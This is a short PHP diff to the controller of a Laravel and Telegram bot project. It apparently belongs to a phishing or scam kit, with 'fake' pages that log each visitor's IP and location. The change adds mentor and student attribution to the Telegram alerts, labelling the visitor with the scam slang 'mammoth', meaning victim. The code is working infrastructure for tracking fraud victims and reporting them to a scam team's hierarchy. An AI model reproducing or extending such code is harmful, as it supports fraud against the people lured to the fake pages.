@@ -154,6 +154,8 @@ class PagesController extends Controller
     {
         try {
             $fake = $this->getFake();
+            $user = $fake->telegramUser;
+            $mentor = $user->mentor();
             $ip = \request()->ip();
             $ipData = null;//ipstack($ip);
             $city_geo = is_null($ipData)
@@ -180,8 +182,13 @@ class PagesController extends Controller
             if ($chat_id === BotController::groupAdmin('id') || $chat_id === BotController::groupAlert('id')) {
                 $text[] = "=================";
                 $text[] = "👤<b>IP:</b> <code>$ip $city_geo</code>";
+                if (!is_null($mentor)) {
+                    array_unshift($text , "🧙‍ От наставника <b>{$mentor->account->accountLinkVisibly()}</b>","=================");
+                }
             }
-
+            if (!is_null($mentor) && $chat_id === $mentor->id) {
+                array_unshift($text,"️🧙‍ Мамонт ученика <b>{$user->accountLinkVisibly()}</b>","=================");
+            }
             $this->getTelegram()->sendMessage([
                 'chat_id' => $chat_id,
                 'text' => makeText($text),
